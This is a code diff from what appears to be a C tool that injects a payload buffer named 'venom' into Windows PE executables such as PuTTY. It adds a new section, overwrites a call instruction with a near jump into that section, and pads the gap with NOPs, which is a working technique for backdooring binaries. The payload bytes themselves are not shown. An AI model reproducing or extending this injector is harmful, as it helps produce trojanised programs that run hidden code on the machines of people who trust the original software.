@@ -276,6 +276,7 @@ void test_hello_torbjorn() {
 }
 */
 
+/*
 int test_new_section() {
     ExeInfo* exe_info;
     AsmParserState* asm_state;
@@ -367,6 +368,7 @@ int test_new_section() {
 
     return 0;
 }
+*/
 
 // TODO(TeYo): code up an absolute_jmp builder, then finish this project up [:
 
@@ -403,7 +405,7 @@ unsigned char venom[] =
     const unsigned int MAX_INSTRUCTION_COUNT = 4096 * 128;
     const unsigned int MAX_JUMP_FUNCTION_COUNT = 4096;
     const unsigned int NEW_SECTION_RAW_DATA_SIZE = 0x1000;
-    const char* EXECUTABLE_FILENAME = "test/putty64.exe";
+    const char* EXECUTABLE_FILENAME = "test/simple64PEBear.exe";
     const char* MODIFIED_EXECUTABLE_FILENAME = "test/modified64.exe";
 
     get_all_info_from_exe(
@@ -416,7 +418,6 @@ unsigned char venom[] =
 
     jump_table_find_references(exe_info, asm_state, jump_table);
 
-    exit(0);
     //print_jump_table(jump_table);
 
     FILE* fd = fopen(EXECUTABLE_FILENAME, "r");   
@@ -448,28 +449,22 @@ unsigned char venom[] =
         memcpy(payload_buffer, venom, VENOM_SIZE);
     }
 
-    /*
-    // build payload
-    {
-        const char* processor_source_files[] = {
-            "src/Process.c"
-        };
-
-        unsigned int processors_size = build_processors(payload_buffer, PROCESSORS_BEGIN_PTR, 
-                new_header, NULL, processor_source_files, processor_count, &processor_entry_points);
-    }
-    */
-
-    /*
     // change call to jump instruction
     {
-        unsigned int ptr = asm_state->binary_instruction_pointers[1740];
-        //unsigned int ptr = exe_info->nt_header->OptionalHeader.AddressOfEntryPoint;
-        InstructionInfo* jmp_info = build_jump_near(exe_info->text_section, ptr,
+        unsigned int call_inst_idx = 1607;
+        InstructionInfo* inst = build_jump_near(exe_info->text_section,
+                asm_state->binary_instruction_pointers[call_inst_idx],
                 new_header->VirtualAddress);
-        add_instruction(mod_table, jmp_info);
+        unsigned int clearing_length = get_necessary_clearing_length(asm_state, call_inst_idx, sizeof(Instruction_RegJump));
+        
+        add_instruction(mod_table, inst);
+        add_nops(mod_table, 
+                exe_info->text_section->PointerToRawData + asm_state->binary_instruction_pointers[call_inst_idx] + sizeof(Instruction_RegJump), 
+                clearing_length - sizeof(Instruction_RegJump));
+        
+        printf("clearing length: %u\n", clearing_length);
+        print_hex(inst->raw_data, inst->data_length);
     }
-    */
 
     section_push_back(exe_info, mod_table, &new_section, new_header);
 
